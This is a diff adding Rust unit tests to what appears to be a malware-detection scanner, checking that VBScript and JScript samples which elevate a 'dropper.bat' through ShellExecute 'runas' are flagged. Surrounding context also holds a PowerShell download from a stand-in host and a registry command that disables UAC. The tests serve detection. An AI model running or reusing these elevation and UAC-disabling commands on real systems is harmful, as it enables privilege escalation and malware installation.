@@ -1370,6 +1370,47 @@ sh.Run("powershell -Command Invoke-WebRequest https://direct-js-const.example/p"
     }
 
     #[test]
+    fn vbs_shell_execute_runas_emits_self_elevation_trait() {
+        let script = br#"Set UAC = CreateObject("Shell.Application")
+UAC.ShellExecute "cmd.exe", "/c ""C:\Users\me\dropper.bat""", "", "runas", 1"#;
+        let mut env = crate::env::Environment::new(&crate::env::Config::default());
+        env.all_extracted_vbs.push(script.to_vec());
+        crate::vbs_scan::scan_vbs_payloads(&mut env);
+        assert!(
+            env.traits.iter().any(|t| matches!(
+                t,
+                Trait::SelfElevation { target, args }
+                    if target == "cmd.exe"
+                        && args
+                            .as_deref()
+                            .is_some_and(|value| value.contains("dropper.bat"))
+            )),
+            "VBS ShellExecute runas SelfElevation not detected: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn js_shell_execute_runas_emits_self_elevation_trait() {
+        let script = br#"WScript.CreateObject("Shell.Application").ShellExecute("cmd.exe", "/c C:\\Users\\me\\dropper.bat", "", "runas", 1);"#;
+        let mut env = crate::env::Environment::new(&crate::env::Config::default());
+        env.all_extracted_jscript.push(script.to_vec());
+        crate::js_scan::scan_js_payloads(&mut env);
+        assert!(
+            env.traits.iter().any(|t| matches!(
+                t,
+                Trait::SelfElevation { target, args }
+                    if target == "cmd.exe"
+                        && args
+                            .as_deref()
+                            .is_some_and(|value| value.contains("dropper.bat"))
+            )),
+            "JS ShellExecute runas SelfElevation not detected: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
     fn uac_policy_weakening_emits_uac_bypass_traits() {
         let script = b"@echo off\r\n\
             reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" /v \"EnableLUA\" /t REG_DWORD /d 0 /f\r\n\
